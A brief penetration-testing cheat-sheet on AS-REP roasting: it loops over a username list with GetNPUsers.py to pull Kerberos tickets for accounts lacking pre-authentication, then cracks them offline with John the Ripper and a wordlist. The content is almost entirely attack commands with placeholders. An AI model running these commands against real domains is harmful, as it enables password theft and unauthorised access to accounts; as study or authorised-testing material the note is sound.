# ASREPRosting

## Given a list of valid domain usernames, query the KDC / Kerberos server to determine which has the "does not require pre-authentication" option set. You can retrieve the TGT of each account that does, and then crack then offline using JTR

* Attempt to get the TGT for each user account

```bash
for u in $(cat <username file>)
do
    GetNPUsers.py <DNS domain name>/$u
done
```

* Save recovered TGTs to tgt.txt

* Attempt to crack recovered TGTs

```bash
john tgt.txt --wordlist=<password list>
```
